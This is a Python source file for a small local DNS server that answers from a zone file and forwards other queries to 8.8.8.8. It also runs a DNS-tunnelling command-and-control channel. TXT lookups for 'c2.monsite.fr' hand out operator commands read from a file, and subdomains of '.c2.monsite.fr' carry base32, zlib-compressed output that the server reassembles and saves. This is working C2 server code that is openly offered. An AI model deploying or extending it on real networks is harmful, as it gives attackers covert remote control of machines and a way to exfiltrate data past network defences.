# ===== Imports =====

import socket
import struct
from time import time
from zlib import decompress
from base64 import b32decode
from json import load


# ===== Variables =====

with open('../data/zone.json', 'r') as zoneFile:
    zone = load(zoneFile)

qtypes = {
    1: "A", 2: "NS",
    5: "CNAME", 12: "PTR",
    15: "MX", 16: "TXT",
    28: "AAAA"
}


# ===== Functions =====

def encode_name(name: str) -> bytes:
    result = b""
    for part in name.split("."):
        result += bytes([len(part)]) + part.encode()
    return result + b"\x00"


def decode_name(data: bytes, offset: int) -> tuple[str | int]:
    labels = []
    while data[offset]:
        length = data[offset]
        offset += 1
        labels.append(data[offset:offset + length].decode())
        offset += length
    return ".".join(labels), offset + 1


def forward(data: bytes, upstream="8.8.8.8") -> bytes | None:
    fsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    fsock.settimeout(3)
    try:
        fsock.sendto(data, (upstream, 53))
        return fsock.recvfrom(4096)[0]
    finally:
        fsock.close()


def decode_data(recvData: str) -> str:
    if len(recvData) % 8 != 0:
        recvData += '='*(8 - (len(recvData) % 8))
    compressedData = b32decode(recvData)
    data = decompress(compressedData)
    return data.decode()


def main() -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("127.0.0.1", 53))
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
    print("DNS prêt sur :53")
    print(f"{len(zone)} entrée(s) en zone locale\n")

    dataChunks = []

    while True:
        try:
            data, addr = sock.recvfrom(512)
            name, offset = decode_name(data, 12)
            qtype = struct.unpack("!H", data[offset:offset+2])[0]

            if name.lower() in zone:
                entry = zone[name.lower()]
                typeName = qtypes.get(qtype)

                if typeName and typeName in entry:
                    records = entry[typeName]
                    encoded = encode_name(name)

                    answers = b""
                    for record in records:
                        if qtype == 1:  # A
                            rdata = socket.inet_aton(record)
                        elif qtype == 28:  # AAAA
                            rdata = socket.inet_pton(socket.AF_INET6, record)
                        elif qtype in (5, 2, 12):  # CNAME, NS, PTR
                            rdata = encode_name(record)
                        elif qtype == 15:  # MX
                            rdata = struct.pack(
                                "!H", record["priority"]
                            ) + encode_name(record["host"])
                        elif qtype == 16:  # TXT
                            txt = record.encode()
                            rdata = bytes([len(txt)]) + txt

                        answers += encoded + struct.pack(
                            "!HHIH", qtype,
                            1, 300,
                            len(rdata)
                        ) + rdata

                    header = struct.pack(
                        "!HHHHHH", struct.unpack("!H", data[:2])[0],
                        0x8180, 1, len(records), 0, 0
                    )
                    sock.sendto(header + data[12:] + answers, addr)
                else:
                    header = struct.pack(
                        "!HHHHHH", struct.unpack("!H", data[:2])[0],
                        0x8180, 1, 0, 0, 0
                    )
                    sock.sendto(header + data[12:], addr)

            elif name == "c2.monsite.fr" and qtype == 16:
                with open('../data/timestamp.txt', 'w') as timestampFile:
                    timestampFile.write(str(time()))
                with open('../data/command.txt', 'r') as commandFile:
                    command = commandFile.read().encode()
                if command:
                    rdata = bytes([len(command)]) + command
                    answer = encode_name(name) + struct.pack(
                        "!HHIH", 16,
                        1, 300, len(rdata)
                    ) + rdata
                    header = struct.pack(
                        "!HHHHHH", struct.unpack("!H", data[:2])[0],
                        0x8180, 1, 1, 0, 0
                    )
                    sock.sendto(header + data[12:] + answer, addr)
                    with open('../data/command.txt', 'w') as commandFile:
                        commandFile.write('')
                else:
                    header = struct.pack(
                        "!HHHHHH", struct.unpack("!H", data[:2])[0],
                        0x8180, 1, 0, 0, 0
                    )
                    sock.sendto(header + data[12:], addr)
            else:
                if name.endswith('.c2.monsite.fr'):
                    splittedName = name.split('.')
                    c2Index = splittedName.index('c2')
                    for i in range(c2Index):
                        if splittedName[i]:
                            dataChunks.append(splittedName[i])

                    rdata = bytes([len(b"2ok")]) + b"2ok"
                    answer = encode_name(name) + struct.pack(
                        "!HHIH", 16,
                        1, 300, len(rdata)
                    ) + rdata
                    header = struct.pack(
                        "!HHHHHH", struct.unpack("!H", data[:2])[0],
                        0x8180, 1, 1, 0, 0
                    )
                    sock.sendto(header + data[12:] + answer, addr)

                    if c2Index < 2 or len(splittedName[c2Index - 1]) < 63:
                        recvData = ''.join(dataChunks)
                        with open('../data/output.txt', 'w') as outputFile:
                            outputFile.write(decode_data(recvData) + "$end$")
                        dataChunks = []
                else:
                    sock.sendto(forward(data), addr)

        except Exception as e:
            print(f"Error: {e}")


# ===== Execution =====

if __name__ == '__main__':
    main()
